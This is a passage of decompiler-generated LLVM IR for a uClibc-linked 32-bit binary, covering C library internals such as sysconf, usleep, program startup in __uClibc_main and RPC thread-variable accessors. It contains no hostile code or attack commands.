  %v0_10020118 = phi i32 [ 0, %dec_label_pc_100200fc ], [ %v2_100200f4, %dec_label_pc_100200d8 ], [ %v0_10020118.pre, %dec_label_pc_10020038 ], [ -1, %dec_label_pc_10020104 ]
  ret i32 %v0_10020118

; uselistorder directives
  uselistorder i32 %v1_10020008, { 1, 0 }
  uselistorder i32 %v2_1001ffb0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1001ff88, { 1, 0 }
  uselistorder i32 %v2_1001ff6c, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 5, 7, 6, 1, 22, 0, 8, 23, 9, 10, 20, 11, 13, 14, 12, 3, 15, 16, 21, 17, 4, 18, 19, 2 }
  uselistorder i32* %r11.global-to-local, { 5, 4, 2, 8, 9, 7, 6, 3, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 ()* @__sigismember, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10020108, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10020104, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100200d0, { 1, 0 }
  uselistorder label %dec_label_pc_100200c4, { 1, 0 }
  uselistorder label %dec_label_pc_1001fff8.dec_label_pc_1001fff8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001ff78.dec_label_pc_1001ff78_crit_edge, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v2_1002011c = icmp ugt i32 %arg1, 149
  br i1 %v2_1002011c, label %dec_label_pc_10020154, label %dec_label_pc_10020130

dec_label_pc_10020130:                            ; preds = %entry
  %v1_10020134 = mul i32 %arg1, 4
  store i32 ptrtoint (i32* @global_var_1002f0fc.1255 to i32), i32* %r9.global-to-local, align 4
  %v2_1002013c = add i32 %v1_10020134, ptrtoint (i32* @global_var_1002f0fc.1255 to i32)
  %v3_1002013c = inttoptr i32 %v2_1002013c to i32*
  %v4_1002013c = load i32, i32* %v3_1002013c, align 4
  %v2_10020140 = add i32 %v4_1002013c, ptrtoint (i32* @global_var_1002f0fc.1255 to i32)
  call void @__pseudo_branch(i32 %v2_10020140)
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10020298

dec_label_pc_10020154:                            ; preds = %entry
  %v0_10020154 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10020160 = inttoptr i32 %v0_10020154 to i32*
  store i32 22, i32* %v2_10020160, align 4
  %v0_1002029c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10020298

dec_label_pc_10020298:                            ; preds = %dec_label_pc_10020154, %dec_label_pc_10020130
  %v0_1002029c = phi i32 [ %v0_1002029c.pre, %dec_label_pc_10020154 ], [ 1, %dec_label_pc_10020130 ]
  ret i32 %v0_1002029c

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 1, 3, 2 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_100202c8 = udiv i32 %arg1, 1000000
  %v2_100202cc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100202c8, i32* %stack_var_-24, align 4
  store i32 268567272, i32* @lr, align 4
  %v2_100202e4 = call i32 @nanosleep(i32 %v2_100202cc, i32 0)
  ret i32 %v2_100202e4

; uselistorder directives
  uselistorder i32 (i32, i32)* @nanosleep, { 1, 3, 2, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10045248.1257 to i32)
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_10020354:
  %v3_10020358 = load i32, i32* @global_var_10045258.1259, align 4
  %v3_1002035c = icmp eq i32 %v3_10020358, 0
  br i1 %v3_1002035c, label %dec_label_pc_1002036c, label %dec_label_pc_10020364

dec_label_pc_10020364:                            ; preds = %dec_label_pc_10020354
  %v1_10020368 = call i32 @unknown_0()
  store i32 %v1_10020368, i32* @r3, align 4
  br label %dec_label_pc_1002036c

dec_label_pc_1002036c:                            ; preds = %dec_label_pc_10020354, %dec_label_pc_10020364
  %v3_10020370 = load i32, i32* @global_var_1004525c.1260, align 4
  %v3_10020374 = icmp eq i32 %v3_10020370, 0
  br i1 %v3_10020374, label %dec_label_pc_1002036c.dec_label_pc_10020384_crit_edge, label %dec_label_pc_1002037c

dec_label_pc_1002036c.dec_label_pc_10020384_crit_edge: ; preds = %dec_label_pc_1002036c
  %v0_10020394.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10020384

dec_label_pc_1002037c:                            ; preds = %dec_label_pc_1002036c
  %v1_10020380 = call i32 @unknown_0()
  br label %dec_label_pc_10020384

dec_label_pc_10020384:                            ; preds = %dec_label_pc_1002036c.dec_label_pc_10020384_crit_edge, %dec_label_pc_1002037c
  %v0_10020394 = phi i32 [ %v0_10020394.pre, %dec_label_pc_1002036c.dec_label_pc_10020384_crit_edge ], [ %v1_10020380, %dec_label_pc_1002037c ]
  ret i32 %v0_10020394

; uselistorder directives
  uselistorder i32 ()* @unknown_0, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_10020384, { 1, 0 }
  uselistorder label %dec_label_pc_1002036c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_100203a0 = load i32, i32* @r3, align 4
  ret i32 %v0_100203a0
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268567496, i32* @lr, align 4
  %v2_100203c4 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_100203c8 = icmp eq i32 %v2_100203c4, -1
  br i1 %v3_100203c8, label %dec_label_pc_100203d0, label %dec_label_pc_100203f0

dec_label_pc_100203d0:                            ; preds = %entry
  %v0_100203d4 = load i32, i32* @r30, align 4
  store i32 %v0_100203d4, i32* @r4, align 4
  store i32 268567524, i32* @lr, align 4
  %v0_100203e0 = call i32 @__libc_open()
  %v1_100203e4 = load i32, i32* @r31, align 4
  %v4_100203e4 = icmp eq i32 %v0_100203e0, %v1_100203e4
  br i1 %v4_100203e4, label %dec_label_pc_100203f0, label %dec_label_pc_100203ec

dec_label_pc_100203ec:                            ; preds = %dec_label_pc_100203d0
  %v1_100203ec = call i32 @abort(i32 %v0_100203e0)
  br label %dec_label_pc_100203f0

dec_label_pc_100203f0:                            ; preds = %entry, %dec_label_pc_100203d0, %dec_label_pc_100203ec
  %v0_10020400 = phi i32 [ %v2_100203c4, %entry ], [ %v0_100203e0, %dec_label_pc_100203d0 ], [ %v1_100203ec, %dec_label_pc_100203ec ]
  ret i32 %v0_10020400

; uselistorder directives
  uselistorder i32 ()* @__libc_open, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_100203f0, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10020404 = load i32, i32* @lr, align 4
  %v3_10020424 = load i32, i32* @global_var_10045260.1262, align 4
  %v3_10020428 = icmp eq i32 %v3_10020424, 0
  br i1 %v3_10020428, label %dec_label_pc_10020430, label %entry.dec_label_pc_10020470_crit_edge

entry.dec_label_pc_10020470_crit_edge:            ; preds = %entry
  %v0_10020480.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10020470

dec_label_pc_10020430:                            ; preds = %entry
  store i32 1, i32* @global_var_10045260.1262, align 4
  store i32 4096, i32* @global_var_10045254.1006, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 17616), i32 0), label %dec_label_pc_1002044c, label %dec_label_pc_10020448

dec_label_pc_10020448:                            ; preds = %dec_label_pc_10020430
  store i32 268567628, i32* @lr, align 4
  %v1_10020448 = call i32 @__pthread_initialize_minimal(i32 268697600)
  br label %dec_label_pc_1002044c

dec_label_pc_1002044c:                            ; preds = %dec_label_pc_10020430, %dec_label_pc_10020448
  store i32 %v0_10020404, i32* @lr, align 4
  %v1_1002046c = call i32 @_stdio_init(i32 268542480)
  br label %dec_label_pc_10020470

dec_label_pc_10020470:                            ; preds = %entry.dec_label_pc_10020470_crit_edge, %dec_label_pc_1002044c
  %v0_10020480 = phi i32 [ %v0_10020480.pre, %entry.dec_label_pc_10020470_crit_edge ], [ %v1_1002046c, %dec_label_pc_1002044c ]
  ret i32 %v0_10020480

; uselistorder directives
  uselistorder label %dec_label_pc_10020470, { 1, 0 }
  uselistorder label %dec_label_pc_1002044c, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1002049c = mul i32 %arg2, 4
  %v2_100204a0 = add i32 %tmp, %v1_1002049c
  %v0_100204a4 = load i32, i32* @r9, align 4
  store i32 %v0_100204a4, i32* @global_var_1004524c.1263, align 4
  %v1_100204a8 = add i32 %v2_100204a0, 4
  store i32 268697600, i32* %r29.global-to-local, align 4
  store i32 %v1_100204a8, i32* @global_var_10045250.1254, align 4
  store i32 %arg6, i32* @global_var_1004525c.1260, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_100204c8 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_100204d0 = icmp eq i32 %v1_100204a8, %v2_100204c8
  br i1 %v4_100204d0, label %dec_label_pc_100204d8, label %dec_label_pc_100204dc

dec_label_pc_100204d8:                            ; preds = %entry
  store i32 %v2_100204a0, i32* @global_var_10045250.1254, align 4
  br label %dec_label_pc_100204dc

dec_label_pc_100204dc:                            ; preds = %entry, %dec_label_pc_100204d8
  %v2_100204dc = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_100204dc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 120, i32* @r5, align 4
  store i32 268567788, i32* @lr, align 4
  %v0_100204e8 = call i32 @__GI_memset()
  %storemerge.pre = load i32, i32* @global_var_10045250.1254, align 4
  br label %dec_label_pc_100204f8

dec_label_pc_100204f8:                            ; preds = %dec_label_pc_100204f8, %dec_label_pc_100204dc
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_100204dc ], [ %v1_100204fc, %dec_label_pc_100204f8 ]
  %v1_100204f8 = inttoptr i32 %storemerge to i32*
  %v2_100204f8 = load i32, i32* %v1_100204f8, align 4
  %v1_100204fc = add i32 %storemerge, 4
  %v3_10020500 = icmp eq i32 %v2_100204f8, 0
  br i1 %v3_10020500, label %dec_label_pc_10020508, label %dec_label_pc_100204f8

dec_label_pc_10020508:                            ; preds = %dec_label_pc_100204f8
  store i32 %v1_100204fc, i32* %r29.global-to-local, align 4
  %v1_1002053412 = inttoptr i32 %v1_100204fc to i32*
  %v2_1002053413 = load i32, i32* %v1_1002053412, align 4
  %v3_1002053816 = icmp eq i32 %v2_1002053413, 0
  br i1 %v3_1002053816, label %dec_label_pc_10020540, label %dec_label_pc_10020510

dec_label_pc_10020510:                            ; preds = %dec_label_pc_10020508, %dec_label_pc_10020530
  %v0_10020524 = phi i32 [ %v1_10020530, %dec_label_pc_10020530 ], [ %v1_100204fc, %dec_label_pc_10020508 ]
  %v0_10020518 = phi i32 [ %v2_10020534, %dec_label_pc_10020530 ], [ %v2_1002053413, %dec_label_pc_10020508 ]
  %v2_10020510 = icmp ugt i32 %v0_10020518, 14
  br i1 %v2_10020510, label %dec_label_pc_10020530, label %dec_label_pc_10020518

dec_label_pc_10020518:                            ; preds = %dec_label_pc_10020510
  %v1_10020518 = mul i32 %v0_10020518, 8
  %v2_10020520 = add i32 %v1_10020518, %v2_100204dc
  store i32 %v2_10020520, i32* @r3, align 4
  store i32 %v0_10020524, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268567856, i32* @lr, align 4
  %v0_1002052c = call i32 @memcpy()
  %v0_10020530.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10020530

dec_label_pc_10020530:                            ; preds = %dec_label_pc_10020510, %dec_label_pc_10020518
  %v0_10020530 = phi i32 [ %v0_10020524, %dec_label_pc_10020510 ], [ %v0_10020530.pre, %dec_label_pc_10020518 ]
  %v1_10020530 = add i32 %v0_10020530, 8
  store i32 %v1_10020530, i32* %r29.global-to-local, align 4
  %v1_10020534 = inttoptr i32 %v1_10020530 to i32*
  %v2_10020534 = load i32, i32* %v1_10020534, align 4
  %v3_10020538 = icmp eq i32 %v2_10020534, 0
  br i1 %v3_10020538, label %dec_label_pc_10020540, label %dec_label_pc_10020510

dec_label_pc_10020540:                            ; preds = %dec_label_pc_10020530, %dec_label_pc_10020508
  %v1_10020544 = call i32 @_dl_aux_init(i32 %v2_100204dc)
  store i32 %v1_10020544, i32* @r3, align 4
  store i32 268567884, i32* @lr, align 4
  %v1_10020548 = call i32 @__GI___uClibc_init(i32 %v1_10020544)
  %v3_10020550 = icmp eq i32 %tmp27, 0
  br i1 %v3_10020550, label %dec_label_pc_10020558, label %dec_label_pc_1002055c

dec_label_pc_10020558:                            ; preds = %dec_label_pc_10020540
  br label %dec_label_pc_1002055c

dec_label_pc_1002055c:                            ; preds = %dec_label_pc_10020540, %dec_label_pc_10020558
  %v0_10020564 = phi i32 [ %tmp27, %dec_label_pc_10020540 ], [ 4096, %dec_label_pc_10020558 ]
  store i32 %v0_10020564, i32* @global_var_10045254.1006, align 4
  %v3_10020568 = icmp eq i32 %tmp26, -1
  br i1 %v3_10020568, label %dec_label_pc_10020570, label %dec_label_pc_100205a4

dec_label_pc_10020570:                            ; preds = %dec_label_pc_1002055c
  store i32 268567924, i32* @lr, align 4
  %v1_10020570 = call i32 @getuid(i32 268697600)
  store i32 %v1_10020570, i32* %r29.global-to-local, align 4
  store i32 268567932, i32* @lr, align 4
  %v0_10020578 = call i32 @geteuid()
  %v4_1002057c = icmp eq i32 %v1_10020570, %v0_10020578
  br i1 %v4_1002057c, label %dec_label_pc_10020584, label %dec_label_pc_100205c0

dec_label_pc_10020584:                            ; preds = %dec_label_pc_10020570
  store i32 268567944, i32* @lr, align 4
  %v1_10020584 = call i32 @getgid(i32 %v0_10020578)
  store i32 %v1_10020584, i32* %r29.global-to-local, align 4
  store i32 268567952, i32* @lr, align 4
  %v0_1002058c = call i32 @getegid()
  %v4_10020590 = icmp eq i32 %v1_10020584, %v0_1002058c
  br i1 %v4_10020590, label %dec_label_pc_10020598.thread, label %dec_label_pc_100205c0

dec_label_pc_10020598.thread:                     ; preds = %dec_label_pc_10020584
  br label %dec_label_pc_100205f0

dec_label_pc_100205a4:                            ; preds = %dec_label_pc_1002055c
  %v4_100205a8 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_100205a8, label %dec_label_pc_100205b0, label %dec_label_pc_100205c0

dec_label_pc_100205b0:                            ; preds = %dec_label_pc_100205a4
  br label %dec_label_pc_100205c0

dec_label_pc_100205c0:                            ; preds = %dec_label_pc_100205b0, %dec_label_pc_100205a4, %dec_label_pc_10020584, %dec_label_pc_10020570
  store i32 268568016, i32* @lr, align 4
  %v2_100205cc = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268568032, i32* @lr, align 4
  %v2_100205dc = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268568048, i32* @lr, align 4
  %v2_100205ec = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_100205f0

dec_label_pc_100205f0:                            ; preds = %dec_label_pc_10020598.thread, %dec_label_pc_100205c0
  %v0_100205fc = load i32, i32* @r30, align 4
  %v1_100205fc = inttoptr i32 %v0_100205fc to i32*
  %v2_100205fc = load i32, i32* %v1_100205fc, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_100205fc, i32* inttoptr (i32 268718420 to i32*), align 4
  %v0_1002061c = load i32, i32* @r27, align 4
  store i32 %v0_1002061c, i32* @global_var_10045258.1259, align 4
  br i1 false, label %dec_label_pc_10020624, label %dec_label_pc_1002069c

dec_label_pc_10020624:                            ; preds = %dec_label_pc_100205f0, %dec_label_pc_10020624
  br i1 undef, label %dec_label_pc_10020624, label %dec_label_pc_1002069c

dec_label_pc_1002069c:                            ; preds = %dec_label_pc_10020624, %dec_label_pc_100205f0
  %v0_10020648 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10020648)
  store i32 0, i32* %r29.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 12172), i32 0), label %dec_label_pc_100206b8, label %dec_label_pc_100206ac

dec_label_pc_100206ac:                            ; preds = %dec_label_pc_1002069c
  %v0_100206ac = call i32 @__errno_location()
  %v2_100206b4 = inttoptr i32 %v0_100206ac to i32*
  store i32 0, i32* %v2_100206b4, align 4
  br label %dec_label_pc_100206b8

dec_label_pc_100206b8:                            ; preds = %dec_label_pc_1002069c, %dec_label_pc_100206ac
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 12164), i32 0), label %dec_label_pc_100206d4, label %dec_label_pc_100206c8

dec_label_pc_100206c8:                            ; preds = %dec_label_pc_100206b8
  %v1_100206c8 = call i32 @__h_errno_location(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 12164))
  %v2_100206d0 = inttoptr i32 %v1_100206c8 to i32*
  store i32 0, i32* %v2_100206d0, align 4
  br label %dec_label_pc_100206d4

dec_label_pc_100206d4:                            ; preds = %dec_label_pc_100206b8, %dec_label_pc_100206c8
  %v0_100206e0 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_100206e0)
  %v0_100206ec = call i32 @__GI_exit()
  ret i32 %v0_100206ec

; uselistorder directives
  uselistorder i32 %v2_10020534, { 1, 0 }
  uselistorder i32 %v1_10020530, { 2, 1, 0 }
  uselistorder i32 %v1_100204fc, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_100204dc, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100206d4, { 1, 0 }
  uselistorder label %dec_label_pc_100206b8, { 1, 0 }
  uselistorder label %dec_label_pc_10020624, { 1, 0 }
  uselistorder label %dec_label_pc_100205f0, { 1, 0 }
  uselistorder label %dec_label_pc_1002055c, { 1, 0 }
  uselistorder label %dec_label_pc_10020530, { 1, 0 }
  uselistorder label %dec_label_pc_10020510, { 1, 0 }
  uselistorder label %dec_label_pc_100204dc, { 1, 0 }
}

define i32 @rpc_thread_multi(i32 %arg1) local_unnamed_addr {
entry:
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32272), i32 0), label %dec_label_pc_10020720, label %dec_label_pc_10020718

dec_label_pc_10020718:                            ; preds = %entry
  %v3_10020718 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_1004da4c.1266 to i32), i32 268763136)
  br label %dec_label_pc_10020728

dec_label_pc_10020720:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1004da4c.1266 to i32), i32* @global_var_10045268.1268, align 4
  br label %dec_label_pc_10020728

dec_label_pc_10020728:                            ; preds = %dec_label_pc_10020718, %dec_label_pc_10020720
  %v0_10020734 = phi i32 [ %v3_10020718, %dec_label_pc_10020718 ], [ 2, %dec_label_pc_10020720 ]
  ret i32 %v0_10020734

; uselistorder directives
  uselistorder label %dec_label_pc_10020728, { 1, 0 }
}

define i32 @__rpc_thread_variables() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256), i32 0), label %dec_label_pc_10020764, label %dec_label_pc_10020758

dec_label_pc_10020758:                            ; preds = %entry
  %v2_1002075c = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256))
  br label %dec_label_pc_1002076c

dec_label_pc_10020764:                            ; preds = %entry
  %v3_10020768 = load i32, i32* @global_var_10045268.1268, align 4
  br label %dec_label_pc_1002076c

dec_label_pc_1002076c:                            ; preds = %dec_label_pc_10020758, %dec_label_pc_10020764
  %storemerge = phi i32 [ %v2_1002075c, %dec_label_pc_10020758 ], [ %v3_10020768, %dec_label_pc_10020764 ]
  %v3_1002076c = icmp eq i32 %storemerge, 0
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br i1 %v3_1002076c, label %dec_label_pc_10020778, label %dec_label_pc_10020850

dec_label_pc_10020778:                            ; preds = %dec_label_pc_1002076c
  store i32 268697600, i32* %r31.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 27308), i32 0), label %dec_label_pc_100207a0, label %dec_label_pc_1002078c

dec_label_pc_1002078c:                            ; preds = %dec_label_pc_10020778
  store i32 ptrtoint (i32* @global_var_1002079c.1271 to i32), i32* @lr, align 4
  %v4_10020798 = call i32 @pthread_once(i32* nonnull @global_var_10045264.1270, i32 268568304, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 27308))
  br label %dec_label_pc_100207b8

dec_label_pc_100207a0:                            ; preds = %dec_label_pc_10020778
  %v3_100207a0 = load i32, i32* @global_var_10045264.1270, align 4
  %v3_100207a4 = icmp eq i32 %v3_100207a0, 0
  br i1 %v3_100207a4, label %dec_label_pc_100207ac, label %dec_label_pc_100207b8

dec_label_pc_100207ac:                            ; preds = %dec_label_pc_100207a0
  store i32 ptrtoint (i32* @global_var_100207b0.1272 to i32), i32* @lr, align 4
  %v1_100207ac = call i32 @rpc_thread_multi(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 27308))
  store i32 1, i32* @global_var_10045264.1270, align 4
  br label %dec_label_pc_100207b8

dec_label_pc_100207b8:                            ; preds = %dec_label_pc_100207a0, %dec_label_pc_1002078c, %dec_label_pc_100207ac
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256), i32 0), label %dec_label_pc_100207d4, label %dec_label_pc_100207c8

dec_label_pc_100207c8:                            ; preds = %dec_label_pc_100207b8
  %v2_100207cc = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256))
  br label %dec_label_pc_100207dc

dec_label_pc_100207d4:                            ; preds = %dec_label_pc_100207b8
  %v3_100207d8 = load i32, i32* @global_var_10045268.1268, align 4
  br label %dec_label_pc_100207dc

dec_label_pc_100207dc:                            ; preds = %dec_label_pc_100207c8, %dec_label_pc_100207d4
  %storemerge1 = phi i32 [ %v2_100207cc, %dec_label_pc_100207c8 ], [ %v3_100207d8, %dec_label_pc_100207d4 ]
  %v3_100207dc = icmp eq i32 %storemerge1, 0
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  br i1 %v3_100207dc, label %dec_label_pc_100207e8, label %dec_label_pc_10020850

dec_label_pc_100207e8:                            ; preds = %dec_label_pc_100207dc
  store i32 268568564, i32* @lr, align 4
  %v2_100207f0 = call i32 @calloc(i32 1, i32 200)
  store i32 %v2_100207f0, i32* %r31.global-to-local, align 4
  %v3_100207f4 = icmp eq i32 %v2_100207f0, 0
  br i1 %v3_100207f4, label %dec_label_pc_10020828, label %dec_label_pc_100207fc

dec_label_pc_100207fc:                            ; preds = %dec_label_pc_100207e8
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32272), i32 0), label %dec_label_pc_1002081c, label %dec_label_pc_1002080c

dec_label_pc_1002080c:                            ; preds = %dec_label_pc_100207fc
  %v3_10020814 = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v2_100207f0, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32272))
  %v0_10020854.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10020850

dec_label_pc_1002081c:                            ; preds = %dec_label_pc_100207fc
  store i32 %v2_100207f0, i32* @global_var_10045268.1268, align 4
  br label %dec_label_pc_10020850

dec_label_pc_10020828:                            ; preds = %dec_label_pc_100207e8
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256), i32 0), label %dec_label_pc_10020844, label %dec_label_pc_10020838

dec_label_pc_10020838:                            ; preds = %dec_label_pc_10020828
  %v2_1002083c = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256))
  br label %dec_label_pc_1002084c

dec_label_pc_10020844:                            ; preds = %dec_label_pc_10020828
  %v3_10020848 = load i32, i32* @global_var_10045268.1268, align 4
  br label %dec_label_pc_1002084c

dec_label_pc_1002084c:                            ; preds = %dec_label_pc_10020838, %dec_label_pc_10020844
  %storemerge2 = phi i32 [ %v2_1002083c, %dec_label_pc_10020838 ], [ %v3_10020848, %dec_label_pc_10020844 ]
  store i32 %storemerge2, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10020850

dec_label_pc_10020850:                            ; preds = %dec_label_pc_100207dc, %dec_label_pc_1002076c, %dec_label_pc_1002081c, %dec_label_pc_1002080c, %dec_label_pc_1002084c
  %v0_10020854 = phi i32 [ %storemerge1, %dec_label_pc_100207dc ], [ %storemerge, %dec_label_pc_1002076c ], [ %v2_100207f0, %dec_label_pc_1002081c ], [ %v0_10020854.pre, %dec_label_pc_1002080c ], [ %storemerge2, %dec_label_pc_1002084c ]
  ret i32 %v0_10020854

; uselistorder directives
  uselistorder i32* @global_var_10045264.1270, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10020850, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1002084c, { 1, 0 }
  uselistorder label %dec_label_pc_100207dc, { 1, 0 }
  uselistorder label %dec_label_pc_100207b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002076c, { 1, 0 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  store i32 268568696, i32* @lr, align 4
  %v0_10020874 = call i32 @__rpc_thread_variables()
  %v4_10020880 = icmp eq i32 %v0_10020874, ptrtoint (i32* @global_var_1004da4c.1266 to i32)
  %v1_10020884 = add i32 %v0_10020874, 148
  br i1 %v4_10020880, label %dec_label_pc_1002088c, label %dec_label_pc_10020894

dec_label_pc_1002088c:                            ; preds = %entry
  br label %dec_label_pc_10020894

dec_label_pc_10020894:                            ; preds = %entry, %dec_label_pc_1002088c
  %v0_100208a0 = phi i32 [ %v1_10020884, %entry ], [ ptrtoint (i32* @global_var_10045270.1276 to i32), %dec_label_pc_1002088c ]
  ret i32 %v0_100208a0

; uselistorder directives
  uselistorder label %dec_label_pc_10020894, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  store i32 268568756, i32* @lr, align 4
  %v0_100208b0 = call i32 @__rpc_thread_variables()
  %v4_100208bc = icmp eq i32 %v0_100208b0, ptrtoint (i32* @global_var_1004da4c.1266 to i32)
  %v1_100208c0 = add i32 %v0_100208b0, 144
  br i1 %v4_100208bc, label %dec_label_pc_100208c8, label %dec_label_pc_100208d0

dec_label_pc_100208c8:                            ; preds = %entry
  br label %dec_label_pc_100208d0

dec_label_pc_100208d0:                            ; preds = %entry, %dec_label_pc_100208c8
  %v0_100208dc = phi i32 [ ptrtoint (i32* @global_var_10045274.1277 to i32), %dec_label_pc_100208c8 ], [ %v1_100208c0, %entry ]
  %storemerge = phi i32 [ 268697600, %dec_label_pc_100208c8 ], [ ptrtoint (i32* @global_var_1004da4c.1266 to i32), %entry ]
  store i32 %storemerge, i32* @r9, align 4
  ret i32 %v0_100208dc

; uselistorder directives
  uselistorder label %dec_label_pc_100208d0, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  store i32 268568816, i32* @lr, align 4
  %v0_100208ec = call i32 @__rpc_thread_variables()
  %v4_100208f8 = icmp eq i32 %v0_100208ec, ptrtoint (i32* @global_var_1004da4c.1266 to i32)
  %v1_100208fc = add i32 %v0_100208ec, 128
  br i1 %v4_100208f8, label %dec_label_pc_10020904, label %dec_label_pc_1002090c

dec_label_pc_10020904:                            ; preds = %entry
  br label %dec_label_pc_1002090c

dec_label_pc_1002090c:                            ; preds = %entry, %dec_label_pc_10020904
  %v0_10020918 = phi i32 [ %v1_100208fc, %entry ], [ ptrtoint (i32* @global_var_1004eee4.1278 to i32), %dec_label_pc_10020904 ]
  ret i32 %v0_10020918

; uselistorder directives
  uselistorder label %dec_label_pc_1002090c, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268568876, i32* @lr, align 4
  %v0_10020928 = call i32 @__rpc_thread_variables()
